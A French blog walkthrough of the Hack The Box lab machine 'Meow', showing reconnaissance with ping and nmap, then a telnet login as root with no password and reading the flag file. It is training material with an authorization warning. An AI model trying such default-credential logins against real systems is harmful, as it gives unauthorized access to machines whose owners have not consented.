---
title: "Meow"
date: 2025-11-17
description: "Comment utiliser une mauvaise configuration Telnet."
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, linux, tier-0]
slug: meow
---

# Introduction

**Meow** est la première box du parcours *Starting Point* de Hack The Box. C'est une machine très simple, idéale pour débuter.

:::note
Dans ce walkthrough, j'anonymise l'IP cible par `99.99.99.99` par précaution.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.
:::

:::warning
Je ne publie pas directement le flag final dans ce guide, l'objectif est d'apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine !
:::

## Vidéo Walkthrough

<iframe
  width="100%"
  style={{aspectRatio: '16/9'}}
  src="https://www.youtube.com/embed/RGixHuuqmsI"
  title="Meow Walkthrough"
  frameBorder="0"
  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
  allowFullScreen
/>

---

## Reconnaissance (Information gathering)

### Découverte d'hôte (Asset discovery)

La première étape est de vérifier que la machine répond avec la commande `ping` suivi de l'**IP** de la cible. Cela permet de confirmer la connectivité réseau.

```bash
┌──(kali㉿kali)-[~]
└─$ ping 99.99.99.99

PING 99.99.99.99 (99.99.99.99) 56(84) bytes of data.
64 bytes from 99.99.99.99: icmp_seq=1 ttl=63 time=12.3 ms
64 bytes from 99.99.99.99: icmp_seq=2 ttl=63 time=12.5 ms
64 bytes from 99.99.99.99: icmp_seq=3 ttl=63 time=12.9 ms
64 bytes from 99.99.99.99: icmp_seq=4 ttl=63 time=156 ms
^C
--- 99.99.99.99 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 12.332/48.529/156.335/62.241 ms
```

Quand on obtient des réponses, on peut interrompre la commande avec `CTRL+C`. Les 4 paquets reçus confirment que la cible est joignable.

### Énumération des services

On va scanner les ports pour connaître les services accessibles et leurs versions. `nmap` est l'outil standard pour ça. J'utilise le flag `-sV` pour la détection de version.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV 99.99.99.99

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 15:47 EDT
Nmap scan report for 99.99.99.99
Host is up (0.067s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```

On voit qu'un seul port est ouvert, le port **23/tcp**. Le service est **telnet** — un service d'administration à distance non chiffré. Sur des machines mal configurées, il peut accepter des connexions sans mot de passe ou avec des identifiants par défaut.

---

## Pré-Exploitation

### Evaluation de vulnérabilités

Avant d'exploiter quoi que ce soit, on vérifie si une connexion interactive est possible. On tente `telnet 99.99.99.99` pour voir l'écran d'accueil et un prompt de login.

```bash
──(kali㉿kali)-[~]
└─$ telnet 99.99.99.99

Trying 99.99.99.99...
Connected to 99.99.99.99.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login:
```

Le service demande un login — on va essayer des identifiants courants ou des comptes sans mot de passe.

---

## Exploitation

### Accès initial

On teste des comptes usuels sans mot de passe (admin, root, etc.).

```bash
──(kali㉿kali)-[~]
└─$ telnet 99.99.99.99

Meow login: admin
Password:

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
```

Sur Meow, la connexion **admin** échoue mais **root** passe sans mot de passe — mauvaise configuration flagrante.

### Post-Exploitation

Après connexion en tant que **root**, on vérifie les infos système avec `uname -a` et `whoami`, puis on liste les fichiers.

```bash
root@Meow:~# ls
flag.txt  snap

root@Meow:~# cat flag.txt

b40{...hidden..}c19
```

La machine est **pwned** !

---

## Pour aller plus loin

### Script automatisé

J'ai fait un script Python qui permet de craquer automatiquement la box Meow :
[MohamedOutougane/Meow_Automated](https://github.com/MohamedOutougane/Meow_Automated)
